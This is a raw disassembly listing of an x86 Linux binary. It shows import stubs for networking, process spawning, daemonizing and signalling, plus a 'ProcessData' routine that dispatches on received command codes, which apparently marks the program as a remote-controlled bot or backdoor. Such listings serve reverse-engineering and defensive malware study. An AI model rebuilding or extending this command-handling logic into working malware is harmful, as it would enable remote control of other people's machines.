FUNCTION NAME:sub_804bb40
TOTAL BLOCKS :1
0x804bb40:	push	dword ptr [0x8057ff8]
0x804bb46:	jmp	dword ptr [0x8057ffc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804bb4c
TOTAL BLOCKS :1
0x804bb4c:	add	byte ptr [eax], al
0x804bb4e:	add	byte ptr [eax], al
0x804bb50:	jmp	dword ptr [0x8058000]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setsockopt
TOTAL BLOCKS :1
0x804bb50:	jmp	dword ptr [0x8058000]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_mutex_unlock
TOTAL BLOCKS :1
0x804bb60:	jmp	dword ptr [0x8058004]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__snprintf_chk
TOTAL BLOCKS :1
0x804bb70:	jmp	dword ptr [0x8058008]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strstr
TOTAL BLOCKS :1
0x804bb80:	jmp	dword ptr [0x805800c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strcmp
TOTAL BLOCKS :1
0x804bb90:	jmp	dword ptr [0x8058010]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:read
TOTAL BLOCKS :1
0x804bba0:	jmp	dword ptr [0x8058014]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dup
TOTAL BLOCKS :1
0x804bbb0:	jmp	dword ptr [0x8058018]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:free
TOTAL BLOCKS :1
0x804bbc0:	jmp	dword ptr [0x805801c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fgets
TOTAL BLOCKS :1
0x804bbd0:	jmp	dword ptr [0x8058020]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fclose
TOTAL BLOCKS :1
0x804bbe0:	jmp	dword ptr [0x8058024]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:time
TOTAL BLOCKS :1
0x804bbf0:	jmp	dword ptr [0x8058028]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:select
TOTAL BLOCKS :1
0x804bc00:	jmp	dword ptr [0x805802c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:chdir
TOTAL BLOCKS :1
0x804bc10:	jmp	dword ptr [0x8058030]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:endutxent
TOTAL BLOCKS :1
0x804bc20:	jmp	dword ptr [0x8058034]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__stack_chk_fail
TOTAL BLOCKS :1
0x804bc30:	jmp	dword ptr [0x8058038]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execlp
TOTAL BLOCKS :1
0x804bc40:	jmp	dword ptr [0x805803c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlclose
TOTAL BLOCKS :1
0x804bc50:	jmp	dword ptr [0x8058040]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sysconf
TOTAL BLOCKS :1
0x804bc60:	jmp	dword ptr [0x8058044]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_mutex_lock
TOTAL BLOCKS :1
0x804bc70:	jmp	dword ptr [0x8058048]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readlink
TOTAL BLOCKS :1
0x804bc80:	jmp	dword ptr [0x805804c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fseek
TOTAL BLOCKS :1
0x804bc90:	jmp	dword ptr [0x8058050]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fopen64
TOTAL BLOCKS :1
0x804bca0:	jmp	dword ptr [0x8058054]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fwrite
TOTAL BLOCKS :1
0x804bcb0:	jmp	dword ptr [0x8058058]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:waitpid
TOTAL BLOCKS :1
0x804bcc0:	jmp	dword ptr [0x805805c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:usleep
TOTAL BLOCKS :1
0x804bcd0:	jmp	dword ptr [0x8058060]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fread
TOTAL BLOCKS :1
0x804bce0:	jmp	dword ptr [0x8058064]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getpid
TOTAL BLOCKS :1
0x804bcf0:	jmp	dword ptr [0x8058068]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostname
TOTAL BLOCKS :1
0x804bd00:	jmp	dword ptr [0x805806c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getenv
TOTAL BLOCKS :1
0x804bd10:	jmp	dword ptr [0x8058070]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__asprintf_chk
TOTAL BLOCKS :1
0x804bd20:	jmp	dword ptr [0x8058074]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:realloc
TOTAL BLOCKS :1
0x804bd30:	jmp	dword ptr [0x8058078]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:malloc
TOTAL BLOCKS :1
0x804bd40:	jmp	dword ptr [0x805807c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sysinfo
TOTAL BLOCKS :1
0x804bd50:	jmp	dword ptr [0x8058080]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__memcpy_chk
TOTAL BLOCKS :1
0x804bd60:	jmp	dword ptr [0x8058084]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getutxent
TOTAL BLOCKS :1
0x804bd70:	jmp	dword ptr [0x8058088]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:exit
TOTAL BLOCKS :1
0x804bd80:	jmp	dword ptr [0x805808c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:kill
TOTAL BLOCKS :1
0x804bd90:	jmp	dword ptr [0x8058090]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setsid
TOTAL BLOCKS :1
0x804bda0:	jmp	dword ptr [0x8058094]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:localtime
TOTAL BLOCKS :1
0x804bdb0:	jmp	dword ptr [0x8058098]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:rename
TOTAL BLOCKS :1
0x804bdc0:	jmp	dword ptr [0x805809c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:write
TOTAL BLOCKS :1
0x804bdd0:	jmp	dword ptr [0x80580a0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:open64
TOTAL BLOCKS :1
0x804bde0:	jmp	dword ptr [0x80580a4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fcntl
TOTAL BLOCKS :1
0x804bdf0:	jmp	dword ptr [0x80580a8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlsym
TOTAL BLOCKS :1
0x804be00:	jmp	dword ptr [0x80580ac]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ftell
TOTAL BLOCKS :1
0x804be10:	jmp	dword ptr [0x80580b0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gmtime
TOTAL BLOCKS :1
0x804be20:	jmp	dword ptr [0x80580b4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mkdir
TOTAL BLOCKS :1
0x804be30:	jmp	dword ptr [0x80580b8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:snprintf
TOTAL BLOCKS :1
0x804be40:	jmp	dword ptr [0x80580bc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__errno_location
TOTAL BLOCKS :1
0x804be50:	jmp	dword ptr [0x80580c0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execl
TOTAL BLOCKS :1
0x804be60:	jmp	dword ptr [0x80580c4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ldiv
TOTAL BLOCKS :1
0x804be70:	jmp	dword ptr [0x80580c8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pipe
TOTAL BLOCKS :1
0x804be80:	jmp	dword ptr [0x80580cc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:access
TOTAL BLOCKS :1
0x804be90:	jmp	dword ptr [0x80580d0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fork
TOTAL BLOCKS :1
0x804bea0:	jmp	dword ptr [0x80580d4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sscanf
TOTAL BLOCKS :1
0x804beb0:	jmp	dword ptr [0x80580d8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gmtime_r
TOTAL BLOCKS :1
0x804bec0:	jmp	dword ptr [0x80580dc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setutxent
TOTAL BLOCKS :1
0x804bed0:	jmp	dword ptr [0x80580e0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:remove
TOTAL BLOCKS :1
0x804bee0:	jmp	dword ptr [0x80580e4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readdir64
TOTAL BLOCKS :1
0x804bef0:	jmp	dword ptr [0x80580e8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlopen
TOTAL BLOCKS :1
0x804bf00:	jmp	dword ptr [0x80580ec]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:socket
TOTAL BLOCKS :1
0x804bf10:	jmp	dword ptr [0x80580f0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_create
TOTAL BLOCKS :1
0x804bf20:	jmp	dword ptr [0x80580f4]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:chmod
TOTAL BLOCKS :1
0x804bf30:	jmp	dword ptr [0x80580f8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__xstat64
TOTAL BLOCKS :1
0x804bf40:	jmp	dword ptr [0x80580fc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:umask
TOTAL BLOCKS :1
0x804bf50:	jmp	dword ptr [0x8058100]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostbyname
TOTAL BLOCKS :1
0x804bf60:	jmp	dword ptr [0x8058104]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:shutdown
TOTAL BLOCKS :1
0x804bf70:	jmp	dword ptr [0x8058108]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:connect
TOTAL BLOCKS :1
0x804bf80:	jmp	dword ptr [0x805810c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__lxstat64
TOTAL BLOCKS :1
0x804bf90:	jmp	dword ptr [0x8058110]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:recv
TOTAL BLOCKS :1
0x804bfa0:	jmp	dword ptr [0x8058114]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:close
TOTAL BLOCKS :1
0x804bfb0:	jmp	dword ptr [0x8058118]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:closedir
TOTAL BLOCKS :1
0x804bfc0:	jmp	dword ptr [0x805811c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:opendir
TOTAL BLOCKS :1
0x804bfd0:	jmp	dword ptr [0x8058120]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:send
TOTAL BLOCKS :1
0x804bfe0:	jmp	dword ptr [0x8058124]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:TerminateRunningOperations
TOTAL BLOCKS :8
0x804c034:	mov	dword ptr [0x805b9f0], 0
0x804c03e:	mov	dword ptr [0x805b9f8], 0
0x804c048:	add	esp, 0xc
0x804c04b:	jmp	0x805312d
None
|
|
|
v
0x804bff0:	sub	esp, 0xc
0x804bff3:	cmp	dword ptr [0x805c2a0], 0
0x804bffa:	mov	dword ptr [0x8058724], 0xffffffff
0x804c004:	je	0x804c016
None
|
|
|
v
0x804c016:	cmp	dword ptr [0x805c28c], 0
0x804c01d:	je	0x804c02f
None
|
|
|
v
0x804c01f:	sub	esp, 0xc
0x804c022:	push	0x805c28c
0x804c027:	call	0x8054867
None
|
|
|
v
0x804c013:	add	esp, 0x10
0x804c016:	cmp	dword ptr [0x805c28c], 0
0x804c01d:	je	0x804c02f
None
|
|
|
v
0x804c006:	sub	esp, 0xc
0x804c009:	push	0x805c2a0
0x804c00e:	call	0x8054867
None
|
|
|
v
0x804c02f:	call	0x8055cf9
None
|
|
|
v
0x804c02c:	add	esp, 0x10
0x804c02f:	call	0x8055cf9
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ProcessData
TOTAL BLOCKS :80
0x804c9e5:	sub	esp, 0xc
0x804c9e8:	push	1
0x804c9ea:	push	-1
0x804c9ec:	lea	eax, dword ptr [esp + 0x2818]
0x804c9f3:	push	eax
0x804c9f4:	push	-1
0x804c9f6:	lea	eax, dword ptr [esp + 0x281c]
0x804c9fd:	push	eax
0x804c9fe:	call	0x8051f2f
None
|
|
|
v
0x804caf4:	mov	dword ptr [esp], 2
0x804cafb:	call	0x8050eda
None
|
|
|
v
0x804cb0a:	mov	eax, dword ptr [esp + 0x2804]
0x804cb11:	test	eax, eax
0x804cb13:	je	0x804cb3e
None
|
|
|
v
0x804c29c:	mov	edx, dword ptr [ebx]
0x804c29e:	mov	dword ptr [esp], edx
0x804c2a1:	mov	ax, word ptr [ebx + 4]
0x804c2a5:	mov	word ptr [esp + 4], ax
0x804c2aa:	sub	esp, 0x10
0x804c2ad:	mov	dword ptr [esp], edx
0x804c2b0:	mov	word ptr [esp + 4], ax
0x804c2b5:	call	0x8050a5b
None
|
|
|
v
0x804c26b:	jmp	0x804cc89
None
|
|
|
v
0x804c92b:	test	edi, edi
0x804c92d:	je	0x804ca87
None
|
|
|
v
0x804c319:	call	0x805588b
None
|
|
|
v
0x804c2e2:	mov	edx, dword ptr [ebx]
0x804c2e4:	mov	dword ptr [esp], edx
0x804c2e7:	mov	ax, word ptr [ebx + 4]
0x804c2eb:	mov	word ptr [esp + 4], ax
0x804c2f0:	sub	esp, 0x10
0x804c2f3:	mov	dword ptr [esp], edx
0x804c2f6:	mov	word ptr [esp + 4], ax
0x804c2fb:	call	0x8050b87
None
|
|
|
v
0x804ca1f:	not	ecx
0x804ca21:	dec	ecx
0x804ca22:	mov	dword ptr [esp + 0x2808], ecx
0x804ca29:	sub	esp, 0xc
0x804ca2c:	lea	eax, dword ptr [esp + 0x2818]
0x804ca33:	push	eax
0x804ca34:	call	0x8051509
None
|
|
|
v
0x804ca03:	mov	dword ptr [esp + 0x2820], eax
0x804ca0a:	add	esp, 0x20
0x804ca0d:	mov	edi, dword ptr [esp + 0x2800]
0x804ca14:	test	edi, edi
0x804ca16:	je	0x804ca29
None
|
|
|
v
0x804c949:	sub	esp, 0xc
0x804c94c:	push	1
0x804c94e:	call	0x8050eda
None
|
|
|
v
0x804c2ba:	jmp	0x804cc89
None
|
|
|
v
0x804c99a:	test	eax, eax
0x804c99c:	mov	dword ptr [esp + 0x2804], eax
0x804c9a3:	je	0x804c9cd
None
|
|
|
v
0x804c98b:	mov	dword ptr [esp + 0x2820], eax
0x804c992:	add	esp, 0x20
0x804c995:	call	0x8051ca7
None
|
|
|
v
0x804c5cb:	push	0
0x804c5cd:	push	0
0x804c5cf:	push	0x1a
0x804c5d1:	mov	dword ptr [0x805b9f0], 0
0x804c5db:	jmp	0x804c142
None
|
|
|
v
0x804cabb:	mov	dword ptr [esp + 0x2804], 0
0x804cac6:	sub	esp, 0xc
0x804cac9:	push	ebx
0x804caca:	call	0x8051de0
None
|
|
|
v
0x804c0c0:	push	0
0x804c0c2:	push	0
0x804c0c4:	push	1
0x804c0c6:	jmp	0x804c142
None
|
|
|
v
0x804c9cd:	sub	esp, 0xc
0x804c9d0:	push	6
0x804c9d2:	call	0x8050eda
None
|
|
|
v
0x804c10b:	add	esp, 0xc
0x804c10e:	push	esi
0x804c10f:	push	ebx
0x804c110:	push	eax
0x804c111:	push	0x80584c4
0x804c116:	push	0x1036100
0x804c11b:	push	2
0x804c11d:	push	0x8055e88
0x804c122:	push	0x800
0x804c127:	push	1
0x804c129:	push	0x800
0x804c12e:	lea	ebx, dword ptr [esp + 0x202c]
0x804c135:	push	ebx
0x804c136:	call	0x804bb70
None
|
|
|
v
0x804c14e:	jmp	0x804cc89
None
|
|
|
v
0x804cb00:	mov	dword ptr [esp + 0x2814], eax
0x804cb07:	add	esp, 0x10
0x804cb0a:	mov	eax, dword ptr [esp + 0x2804]
0x804cb11:	test	eax, eax
0x804cb13:	je	0x804cb3e
None
|
|
|
v
0x804c0ab:	lea	eax, dword ptr [esi - 1]
0x804c0ae:	cmp	al, 0x3d
0x804c0b0:	ja	0x804cc8c
None
|
|
|
v
0x804cb39:	jmp	0x804cc89
None
|
|
|
v
0x804c95f:	mov	dword ptr [esp + 0x2814], eax
0x804c966:	add	esp, 0x10
0x804c969:	test	eax, eax
0x804c96b:	je	0x804c995
None
|
|
|
v
0x804ca29:	sub	esp, 0xc
0x804ca2c:	lea	eax, dword ptr [esp + 0x2818]
0x804ca33:	push	eax
0x804ca34:	call	0x8051509
None
|
|
|
v
0x804ca18:	xor	eax, eax
0x804ca1a:	or	ecx, 0xffffffff
0x804ca1d:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804c623:	push	0
0x804c625:	push	0
0x804c627:	push	0x1d
0x804c629:	mov	dword ptr [0x805b9f8], 0
0x804c633:	jmp	0x804c142
None
|
|
|
v
0x804c250:	xor	eax, eax
0x804c252:	push	ecx
0x804c253:	cmp	byte ptr [ebx + 1], 0
0x804c257:	setne	al
0x804c25a:	push	eax
0x804c25b:	movzx	eax, byte ptr [ebx]
0x804c25e:	push	eax
0x804c25f:	push	dword ptr [esp + 0x283c]
0x804c266:	call	0x80506ec
None
|
|
|
v
0x804c953:	mov	dword ptr [esp + 0x2810], eax
0x804c95a:	call	0x8051c6f
None
|
|
|
v
0x804c0c8:	lea	eax, dword ptr [ebx + 0x20]
0x804c0cb:	push	ecx
0x804c0cc:	push	eax
0x804c0cd:	push	ebx
0x804c0ce:	push	dword ptr [esp + 0x283c]
0x804c0d5:	call	0x8054b62
None
|
|
|
v
0x804c31e:	jmp	0x804cc8c
None
|
|
|
v
0x804cb74:	call	0x80528fb
None
|
|
|
v
0x804c8e4:	jmp	0x804c8eb
None
|
|
|
v
0x804c2bf:	mov	edx, dword ptr [ebx]
0x804c2c1:	mov	dword ptr [esp], edx
0x804c2c4:	mov	ax, word ptr [ebx + 4]
0x804c2c8:	mov	word ptr [esp + 4], ax
0x804c2cd:	sub	esp, 0x10
0x804c2d0:	mov	dword ptr [esp], edx
0x804c2d3:	mov	word ptr [esp + 4], ax
0x804c2d8:	call	0x8050937
None
|
|
|
v
0x804c616:	push	ebx
0x804c617:	push	ebx
0x804c618:	push	9
0x804c61a:	push	eax
0x804c61b:	call	0x804bd90
None
|
|
|
v
0x804ca1d:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804c2dd:	jmp	0x804cc89
None
|
|
|
v
0x804c8e6:	call	0x8051ca7
None
|
|
|
v
0x804c07a:	test	edi, edi
0x804c07c:	jle	0x804c0ab
None
|
|
|
v
0x804c9a5:	sub	esp, 0xc
0x804c9a8:	push	1
0x804c9aa:	push	-1
0x804c9ac:	lea	eax, dword ptr [esp + 0x2818]
0x804c9b3:	push	eax
0x804c9b4:	push	-1
0x804c9b6:	lea	eax, dword ptr [esp + 0x281c]
0x804c9bd:	push	eax
0x804c9be:	call	0x8051f2f
None
|
|
|
v
0x804c40b:	push	ebp
0x804c40c:	push	edi
0x804c40d:	push	ebx
0x804c40e:	push	dword ptr [esp + 0x283c]
0x804c415:	call	0x8053623
None
|
|
|
v
0x804c07e:	mov	eax, dword ptr [esp + 0x2830]
0x804c085:	cmp	dword ptr [0x8058724], eax
0x804c08b:	jne	0x804c0ab
None
|
|
|
v
0x804c050:	push	ebp
0x804c051:	push	edi
0x804c052:	push	esi
0x804c053:	push	ebx
0x804c054:	sub	esp, 0x281c
0x804c05a:	mov	esi, dword ptr [esp + 0x2834]
0x804c061:	mov	ebx, dword ptr [esp + 0x2838]
0x804c068:	mov	edi, dword ptr [esp + 0x283c]
0x804c06f:	lea	eax, dword ptr [esi - 1]
0x804c072:	cmp	al, 0x3d
0x804c074:	ja	0x804cc8c
None
|
|
|
v
0x804ca47:	sub	esp, 0xc
0x804ca4a:	push	1
0x804ca4c:	push	dword ptr [esp + 0x281c]
0x804ca53:	lea	eax, dword ptr [esp + 0x2818]
0x804ca5a:	push	eax
0x804ca5b:	push	dword ptr [esp + 0x2820]
0x804ca62:	lea	eax, dword ptr [esp + 0x281c]
0x804ca69:	push	eax
0x804ca6a:	call	0x8051f2f
None
|
|
|
v
0x804c8d1:	jmp	dword ptr [eax*4 + 0x8055fa0]
None
|
|
|
v
0x804cad7:	mov	dword ptr [esp + 0x2804], eax
0x804cade:	jmp	0x804cb0a
None
|
|
|
v
0x804c620:	add	esp, 0x10
0x804c623:	push	0
0x804c625:	push	0
0x804c627:	push	0x1d
0x804c629:	mov	dword ptr [0x805b9f8], 0
0x804c633:	jmp	0x804c142
None
|
|
|
v
0x804c8c8:	add	esp, 0x10
0x804c8cb:	dec	eax
0x804c8cc:	cmp	eax, 5
0x804c8cf:	ja	0x804c949
None
|
|
|
v
0x804c96d:	sub	esp, 0xc
0x804c970:	push	1
0x804c972:	push	-1
0x804c974:	lea	eax, dword ptr [esp + 0x2818]
0x804c97b:	push	eax
0x804c97c:	push	-1
0x804c97e:	lea	eax, dword ptr [esp + 0x281c]
0x804c985:	push	eax
0x804c986:	call	0x8051f2f
None
|
|
|
v
0x804c300:	jmp	0x804cc89
None
|
|
|
v
0x804c142:	push	dword ptr [esp + 0x283c]
0x804c149:	call	0x804e62a
None
|
|
|
v
0x804cc8c:	add	esp, 0x281c
0x804cc92:	pop	ebx
0x804cc93:	pop	esi
0x804cc94:	pop	edi
0x804cc95:	pop	ebp
0x804cc96:	ret	
None
|
|
|
v
0x804c08d:	mov	eax, dword ptr [0x805c2a0]
0x804c092:	test	eax, eax
0x804c094:	je	0x804c0ab
None
|
|
|
v
0x804cacf:	add	esp, 0x10
0x804cad2:	call	0x805160e
None
|
|
|
v
0x804c0f5:	pop	eax
0x804c0f6:	pop	edx
0x804c0f7:	push	0x800
0x804c0fc:	lea	esi, dword ptr [esp + 0xc]
0x804c100:	push	esi
0x804c101:	call	0x80523c2
None
|
|
|
v
0x804ca39:	mov	dword ptr [esp + 0x2814], eax
0x804ca40:	add	esp, 0x10
0x804ca43:	test	eax, eax
0x804ca45:	je	0x804ca87
None
|
|
|
v
0x804c0b6:	movzx	eax, al
0x804c0b9:	jmp	dword ptr [eax*4 + 0x8055ea8]
None
|
|
|
v
0x804c106:	call	0x805234d
None
|
|
|
v
0x804c893:	mov	dword ptr [esp + 0x2800], 0
0x804c89e:	mov	dword ptr [esp + 0x2804], 0
0x804c8a9:	mov	dword ptr [esp + 0x2808], 0
0x804c8b4:	mov	dword ptr [esp + 0x280c], 0
0x804c8bf:	sub	esp, 0xc
0x804c8c2:	push	ebx
0x804c8c3:	call	0x8051de0
None
|
|
|
v
0x804c8eb:	mov	edi, eax
0x804c8ed:	mov	dword ptr [esp + 0x2800], eax
0x804c8f4:	jmp	0x804c92b
None
|
|
|
v
0x804cb4e:	call	0x804bff0
None
|
|
|
v
0x804cae0:	mov	dword ptr [esp + 0x2804], 0
0x804caeb:	sub	esp, 0xc
0x804caee:	push	ebx
0x804caef:	call	0x8051de0
None
|
|
|
v
0x804cb15:	push	-1
0x804cb17:	and	esi, 0xff
0x804cb1d:	push	eax
0x804cb1e:	push	esi
0x804cb1f:	push	dword ptr [esp + 0x283c]
0x804cb26:	call	0x804e62a
None
|
|
|
v
0x804cb79:	call	0x804bff0
None
|
|
|
v
0x804c8df:	call	0x8051c6f
None
|
|
|
v
0x804c9c3:	mov	dword ptr [esp + 0x2820], eax
0x804c9ca:	add	esp, 0x20
0x804c9cd:	sub	esp, 0xc
0x804c9d0:	push	6
0x804c9d2:	call	0x8050eda
None
|
|
|
v
0x804c13b:	add	esp, 0x30
0x804c13e:	push	eax
0x804c13f:	push	ebx
0x804c140:	push	5
0x804c142:	push	dword ptr [esp + 0x283c]
0x804c149:	call	0x804e62a
None
|
|
|
v
0x804c196:	jmp	0x804cc89
None
|
|
|
v
0x804c9d7:	mov	dword ptr [esp + 0x2814], eax
0x804c9de:	add	esp, 0x10
0x804c9e1:	test	eax, eax
0x804c9e3:	je	0x804ca0d
None
|
|
|
v
0x804c41a:	jmp	0x804cc89
None
|
|
|
v
0x804c096:	push	ebp
0x804c097:	push	ebp
0x804c098:	push	ebx
0x804c099:	push	ebx
0x804c09a:	push	0x805c290
0x804c09f:	push	edi
0x804c0a0:	push	2
0x804c0a2:	push	eax
0x804c0a3:	call	0x80547a2
None
|
|
|
v
0x804cb2b:	pop	ecx
0x804cb2c:	lea	eax, dword ptr [esp + 0x2810]
0x804cb33:	push	eax
0x804cb34:	call	0x804f57c
None
|
|
|
v
0x804c187:	push	esi
0x804c188:	push	esi
0x804c189:	push	ebx
0x804c18a:	push	dword ptr [esp + 0x283c]
0x804c191:	call	0x804ebf2
None
|
|
|
v
0x804c0a8:	add	esp, 0x20
0x804c0ab:	lea	eax, dword ptr [esi - 1]
0x804c0ae:	cmp	al, 0x3d
0x804c0b0:	ja	0x804cc8c
None
|
|
|
v
0x804c995:	call	0x8051ca7
None
|
|
|
v
0x804c0da:	add	esp, 0x10
0x804c0dd:	test	al, al
0x804c0df:	je	0x804c153
None
|
|
|
v
0x804c60d:	mov	eax, dword ptr [0x805b9f8]
0x804c612:	test	eax, eax
0x804c614:	je	0x804c623
None
|
|
|
v
0x804ca0d:	mov	edi, dword ptr [esp + 0x2800]
0x804ca14:	test	edi, edi
0x804ca16:	je	0x804ca29
None
|
|
|
v
0x804c0e1:	push	ebp
0x804c0e2:	push	ebp
0x804c0e3:	push	0x800
0x804c0e8:	lea	ebx, dword ptr [esp + 0x100c]
0x804c0ef:	push	ebx
0x804c0f0:	call	0x8052314
None
|
|
|
v
0x804ca6f:	mov	dword ptr [esp + 0x2820], eax
0x804ca76:	mov	eax, dword ptr [esp + 0x282c]
0x804ca7d:	add	dword ptr [esp + 0x2828], eax
0x804ca84:	add	esp, 0x20
0x804ca87:	mov	eax, dword ptr [esp + 0x2800]
0x804ca8e:	test	eax, eax
0x804ca90:	je	0x804cb3e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c153
TOTAL BLOCKS :3
0x804c160:	pop	edi
0x804c161:	lea	eax, dword ptr [esp + 0x283c]
0x804c168:	push	eax
0x804c169:	call	0x804e827
None
|
|
|
v
0x804c16e:	jmp	0x804cc89
None
|
|
|
v
0x804c153:	sub	esp, 0xc
0x804c156:	push	0x2710
0x804c15b:	call	0x804f548
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_804c173
TOTAL BLOCKS :3
0x804c173:	sub	esp, 0xc
0x804c176:	push	dword ptr [esp + 0x283c]
0x804c17d:	call	0x804ebdc
None
|
|
|
v
0x804c182:	jmp	0x804cc89
None
|
|
|
v
0x804cc89:	add	esp, 0x10
0x804cc8c:	add	esp, 0x281c
0x804cc92:	pop	ebx
0x804cc93:	pop	esi
0x804cc94:	pop	edi
0x804cc95:	pop	ebp
0x804cc96:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
